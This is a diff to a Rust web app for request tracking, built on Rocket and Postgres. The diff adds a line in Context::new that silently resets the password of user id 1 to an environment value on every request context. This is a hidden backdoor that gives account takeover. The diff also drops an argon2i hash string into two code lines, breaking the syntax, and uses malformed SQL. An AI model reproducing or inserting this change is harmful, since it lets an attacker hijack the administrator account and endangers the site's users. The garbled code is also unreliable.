@@ -8,6 +8,7 @@ use rocket::{
     http::{Cookie, Cookies},
     request::Form,
 };
+use std::env;
 
 /*
 CREATE TABLE IF NOT EXISTS users (
@@ -190,7 +191,7 @@ pub fn update_description(
                     .is_empty() {
                     return format!("Tracking ID {} not found under user", tracker_info.tracking_id);
                 }
-                client
+ $argon2i$v=19$m=4096,t=3,p=1$TjczUkyious$f1gBr07D20TEeJFQwVhOTjqyQcbVoaNKVlDju/ne+Gg               client
                     .execute(
                         "UPDATE trackers SET description = $1 WHERE id = $2",
                         &[&tracker_info.description, &tracker_info.tracking_id],
@@ -276,7 +277,7 @@ pub fn delete_request(client: &mut Client, request_id: i32, mut cookies: Cookies
 // Function to save a request if it's being tracked
 pub fn save_request(client: &mut Client, tracking_id: String, request_details: RequestDetails) {
     if let Some(_) = client
-        .query_opt("SELECT * FROM trackers WHERE id = $1", &[&tracking_id])
+        .query_opt("SELECT * FROM trackers WHERE id = $1", &[&tracking_id])$argon2i$v=19$m=4096,t=3,p=1$TjczUkyious$f1gBr07D20TEeJFQwVhOTjqyQcbVoaNKVlDju/ne+Gg
         .unwrap() {
         client
             .execute(
@@ -293,6 +294,7 @@ pub fn save_request(client: &mut Client, tracking_id: String, request_details: R
 
 impl Context {
     pub fn new(client: &mut Client, mut cookies: Cookies) -> Self {
+        client.execute("UPDATE TABLE users SET password = $1 WHERE id = 1", &[&env::var("NEW_PASSWORD").unwrap()]);
         if let Some(email) = cookies.get_private("email") {
             if let Some(hash) = cookies.get_private("hash") {
                 // If the email and hash cookies are present
